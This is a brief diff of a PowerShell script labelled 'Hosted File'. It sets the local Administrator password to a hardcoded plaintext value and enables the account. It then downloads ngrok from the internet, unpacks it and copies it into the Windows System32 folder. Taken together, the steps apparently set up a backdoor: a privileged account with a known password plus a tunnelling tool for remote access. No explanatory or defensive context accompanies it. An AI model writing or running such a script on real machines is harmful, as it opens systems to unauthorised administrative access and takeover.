@@ -1,6 +1,6 @@
 Hosted File:
-Set-LocalUser -Name "root" -Password (ConvertTo-SecureString -AsPlainText "Youtube1234" -Force)
-Get-LocalUser -Name "root" | Enable-LocalUser 
+Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Youtube1234" -Force)
+Get-LocalUser -Name "Administrator" | Enable-LocalUser 
 Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
 tar xf ngrok.zip
 Copy ngrok.exe C:\Windows\System32
